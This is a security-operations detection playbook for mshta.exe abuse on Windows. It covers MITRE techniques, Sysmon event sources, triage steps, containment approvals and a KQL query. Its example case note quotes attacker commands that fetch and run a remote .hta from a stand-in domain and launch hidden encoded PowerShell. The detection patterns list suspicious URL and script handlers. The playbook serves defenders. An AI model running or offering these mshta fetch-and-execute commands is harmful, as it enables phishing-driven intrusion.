# EP-009 — mshta Abuse

**Category:** Endpoint - Execution & LOLBins

## Business Risk

**[STAKEHOLDER]** - `mshta.exe` is a signed Microsoft binary whose entire job is running HTML Applications (`.hta` files) and inline VBScript/JScript. Attackers like it because it's on every Windows build, it's trusted by default, and it can execute a script directly from a double-click, a phishing link, or a `rundll32`-style one-liner without ever writing an unsigned executable to disk. When this shows up in a real incident it's almost always the first ten seconds of a phishing-driven compromise - a user opened an attachment or clicked a "view invoice" link, and mshta quietly became the launchpad for a PowerShell stage, a credential grab, or a persistence mechanism. The business exposure is the same as any other initial-access foothold: it scales with what that user's account and that host can reach next.

## Severity / Priority Default

**High** on first trigger. mshta has essentially no routine business use in most enterprise environments - unlike PowerShell or cmd.exe, there is no large population of legitimate admin scripts calling it daily. A confirmed mshta execution with a network-facing or script-block command line should be treated as likely-compromised until proven otherwise, not tuned down by default.

## MITRE ATT&CK Techniques

- **T1218.005** - System Binary Proxy Execution: Mshta (primary technique)
- **T1204.001 / T1204.002** - User Execution: Malicious File / Malicious Link (the phishing step that gets mshta launched in the first place)
- **T1027** - Obfuscated Files or Information (the HTA's embedded VBScript/JScript is almost always obfuscated - string-splitting, `Chr()` building, base64 blobs)
- **T1059.001** - Command and Scripting Interpreter: PowerShell (mshta's near-universal follow-on action is spawning PowerShell)
- **T1105** - Ingress Tool Transfer (stage-two payload download once the HTA runs)
- **T1547.001** - Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder (a common persistence pattern is a Run key that re-launches `mshta.exe` against a script pointer on reboot)
- **T1053.005** - Scheduled Task/Job: Scheduled Task (alternative persistence mechanism, re-invoking mshta on a timer)

## Trigger / Detection Logic Summary

Fire on any `mshta.exe` process creation where the command line references a remote URL (`http://`, `https://`, a UNC/WebDAV path), an inline script protocol handler (`javascript:`, `vbscript:`), or a local `.hta` path outside of known vendor/help-viewer install locations - correlated with a parent process that is user-facing (`outlook.exe`, `winword.exe`, `excel.exe`, `explorer.exe`, `iexplore.exe`, `chrome.exe`, `msedge.exe`) rather than an installer or management agent. A second, independent trigger: `mshta.exe` itself spawning a child process - `powershell.exe`, `cmd.exe`, `wscript.exe`, `rundll32.exe` - which is almost never legitimate behavior for an HTA viewer and should be weighted very high regardless of the parent chain above it.

## Required Log Sources & Event IDs

| Source | Event ID | Why |
|---|---|---|
| Sysmon | 1 (Process Creation) | Full mshta command line, parent image/command line, integrity level - the anchor event for this whole playbook |
| Sysmon | 3 (Network Connection) | Confirms mshta.exe or its child made an outbound connection to fetch the HTA content or a stage-two payload |
| Sysmon | 22 (DNSEvent) | Domain resolution tied to the mshta PID - first-seen/rare domain is a strong signal here |
| Sysmon | 11 (FileCreate) | Dropped `.hta` file, downloaded stage-two payload, or a persistence script written to disk |
| Sysmon | 15 (FileCreateStreamHash) | Mark-of-the-web / zone identifier on a downloaded `.hta` - confirms it arrived via browser/email rather than being locally authored |
| Sysmon | 12 / 13 / 14 (RegistryEvent) | Run key or startup value created/modified to re-launch mshta on logon - persistence |
| Windows Security | 4688 | Fallback without Sysmon; command line only populated if CLI auditing (`Include command line in process creation events`) is enabled via GPO |
| Windows Security | 4698 | Scheduled task created that re-invokes `mshta.exe` - alternative persistence path |
| Microsoft-Windows-PowerShell/Operational | 4104 | Script block text for any PowerShell mshta's HTA spawns - critical for decoding the next stage |

## Key Fields to Inspect

**[ANALYST]**
- `CommandLine` (Sysmon 1 / 4688) - look for a URL, a UNC path, `javascript:`, `vbscript:`, or a `.hta` filename that doesn't match any installed application's known help/setup file
- `ParentImage` / `ParentCommandLine` - Outlook or a browser launching mshta directly is the classic phishing pattern; an installer's setup wrapper launching a vendor-signed `.hta` from `Program Files` is the classic benign pattern - the path matters as much as the parent name
- `Image` / `CommandLine` of mshta's **children** - a PowerShell, cmd.exe, or wscript.exe child is the single strongest indicator in this whole playbook
- `Hashes` (Sysmon 1) - hash the `.hta` file if one was dropped locally, check reputation
- `DestinationIp`/`DestinationPort` (Sysmon 3) - non-standard ports, or a destination with no prior relationship to the org
- `QueryName` (Sysmon 22) - newly registered or uncategorized domain feeding the HTA content
- `TargetFilename` (Sysmon 11/15) - where the `.hta` landed, and whether it carries a Zone.Identifier ADS pointing to an internet or email source
- `TargetObject` (Sysmon 12/13/14) - Run key value pointing back at `mshta.exe <path or URL>`
- `ScriptBlockText` (4104) - the decoded PowerShell that mshta's embedded script ultimately calls out to

## Normal vs Suspicious Pattern

| Normal | Suspicious |
|---|---|
| `mshta.exe` launched from a vendor installer path (`C:\Program Files\VendorApp\help.hta`) by that vendor's setup executable | `mshta.exe` launched by `OUTLOOK.EXE`, `WINWORD.EXE`, or a browser process |
| Command line references a local `.hta` under a known install directory | Command line references `http://`, `https://`, a WebDAV/UNC path, or an inline `javascript:`/`vbscript:` blob |
| No child processes spawned - the HTA just renders a help/setup dialog and exits | `mshta.exe` spawns `powershell.exe`, `cmd.exe`, `wscript.exe`, or `rundll32.exe` |
| File has no internet mark-of-the-web, was placed by an installer during a documented change | `.hta` carries a Zone.Identifier ADS showing it arrived via Outlook/Edge/Chrome download |
| Runs once, during install/setup, matches a change ticket | Runs from a user's Downloads/Temp/AppData folder, immediately after an email or browser session, at an odd hour |
| No persistence artifact follows | A Run key or scheduled task is created referencing `mshta.exe` shortly after |

## Investigation Steps

1. Pull the Sysmon 1 (or 4688) record for the `mshta.exe` process: exact `CommandLine`, `ParentImage`, `ParentCommandLine`, `User`, `IntegrityLevel`. Decide immediately whether the parent is user-facing (suspicious) or an installer/management agent (needs corroboration either way).
2. Check for child processes of the same mshta PID/GUID. A PowerShell, cmd.exe, or wscript.exe child within seconds of launch is close to a slam-dunk true positive - go straight to that child's own command line and treat this as a PowerShell/download-cradle investigation from there too.
3. If mshta's command line references a URL or UNC path, check Sysmon 3/22 for the corresponding network connection and DNS query on the same PID - capture destination IP/domain, first-seen status, and any threat-intel match.
4. If a local `.hta` path is involved, check Sysmon 15 for a Zone.Identifier alternate data stream - this tells you whether the file was downloaded/emailed versus placed by a trusted installer, independent of what the parent process claims.
5. Look for persistence: Sysmon 12/13/14 registry writes referencing `mshta.exe` in a Run key, or a 4698 scheduled task with `mshta.exe` in the action. Either confirms the attacker is planning to survive a reboot, not just run once.
6. Trace the chain back to origin - email attachment, a link in a phishing message, a compromised web page, or a macro that wrote the `.hta` and then called mshta to run it. Pull the original email/download event if available; this is your initial-access vector for the writeup.
7. Check for lateral spread - has the same `.hta` hash, command-line pattern, or C2 domain appeared on any other endpoint in the environment? Default lookback 7 days; extend to 30 days once this is confirmed True Positive.
8. Validate against known vendor/install activity before closing - some legacy line-of-business software and a handful of Windows help/wizard components still use `.hta` legitimately; confirm the file path and publisher before you commit to a verdict.

## True Positive Indicators

- `mshta.exe` command line contains a remote URL, UNC/WebDAV path, or inline `javascript:`/`vbscript:` payload
- `mshta.exe` spawns a child process (`powershell.exe`, `cmd.exe`, `wscript.exe`, `rundll32.exe`)
- Parent process is Outlook, a browser, or Word/Excel rather than an installer
- `.hta` file carries a mark-of-the-web ADS showing it arrived via email or download
- Follow-on persistence (Run key or scheduled task referencing mshta) or a beacon-like recurring DNS/network pattern to the same destination

## False Positive / Benign Positive Indicators

- `.hta` path resolves to a known vendor install directory and was launched by that vendor's signed setup process, matching a documented install/upgrade activity
- No child process spawned, no outbound network connection, no persistence artifact created - the HTA opened a static help/config dialog and exited cleanly
- File has no mark-of-the-web ADS and its creation timestamp lines up with an install/change record rather than a download or email event
- A small number of legacy internal line-of-business tools are known in your environment to use `.hta` as a UI front-end - confirmed against your application inventory, not assumed

## Escalation Criteria

Escalate to Tier 2/IR immediately if mshta spawned a scripting or shell child process, if the destination domain/IP matches threat intel or is a newly registered/uncategorized domain, if a persistence artifact (Run key or scheduled task) was created, or if the same `.hta` hash or C2 indicator appears on more than one host. Escalate even if the outbound connection was blocked at the proxy - a blocked callback still confirms the HTA executed and the phishing/delivery vector upstream succeeded; don't let "it was blocked" become the reason nothing gets written up.

## Containment Options & Approval Authority

**[MANAGEMENT]**
- Kill `mshta.exe` and any spawned child processes - Tier 1/2 analyst, no separate approval needed, log the action and PIDs in the case.
- Single-endpoint EDR network isolation - Tier 2 can execute unilaterally under standard SOC authority; notify on-call IR lead within 15 minutes.
- Block the C2 domain/IP at proxy/firewall - Tier 2 can push immediately at high IOC confidence; otherwise requires network team sign-off within SLA (target 30 minutes for confirmed malicious).
- Remove persistence (Run key, scheduled task) - Tier 2/3, change-managed action, document the exact registry value or task XML in the ticket before deletion.
- Disable local scripting for mshta via GPO/AppLocker/WDAC (block `mshta.exe` execution or restrict to signed/allowlisted `.hta` paths) - requires IR lead and engineering sign-off given the (small) risk of breaking a legitimate line-of-business tool; roll out as a phased policy change, not an emergency same-day block.
- Disable the user account if the phishing click also exposed credentials (e.g., a fake login page chained off the HTA) - requires IR lead or manager approval, coordinate with the account owner's manager.

SLA target: triage start within 15 minutes of alert (High severity default), containment decision within 30 minutes once the command line, child-process behavior, and network callout are confirmed.

## Example Query (Microsoft Sentinel / KQL, Defender for Endpoint schema)

```kql
DeviceProcessEvents
| where FileName =~ "mshta.exe"
| where InitiatingProcessFileName in~ ("outlook.exe","winword.exe","excel.exe","chrome.exe","msedge.exe")
    or ProcessCommandLine has_any ("http://","https://","javascript:","vbscript:")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc
```

## Closure Criteria

Close as **True Positive** once the delivery vector, the HTA/script content, and any follow-on execution or persistence are confirmed malicious and contained - host isolated/remediated, IOC blocked, ticket documents the full command line, child processes, and destination. Close as **Benign Positive** when the `.hta` path, publisher, and launch context all tie back to a verified vendor install or documented internal tool with no network callout or child process. Close as **Insufficient Evidence** if command-line auditing wasn't enabled and Sysmon wasn't deployed on the host - don't force a verdict from a bare process name with no arguments, but open a logging-gap ticket so the next mshta execution on that host doesn't leave you blind again.

**Example case note:** *"mshta.exe on WKS-FIN-0231 (user r.chen) launched by OUTLOOK.EXE with command line `mshta.exe http://cdn-assets.example-updates.net/invoice_view.hta`. Sysmon 3 confirms outbound to 203.0.113.44:80, Sysmon 22 shows domain first-seen in environment, registered six days prior. Within four seconds mshta spawned `powershell.exe -nop -w hidden -enc <base64>`; 4104 script block recovered a download cradle pulling a second-stage payload from the same domain. Sysmon 12 shows a Run key written under HKCU\\...\\Run pointing back at the original mshta command - persistence established before EDR isolation. Host isolated 14:07 UTC, domain and hash submitted to blocklist, source phishing email traced and other recipients checked (none clicked). Verdict: True Positive, T1218.005/T1059.001/T1547.001."*
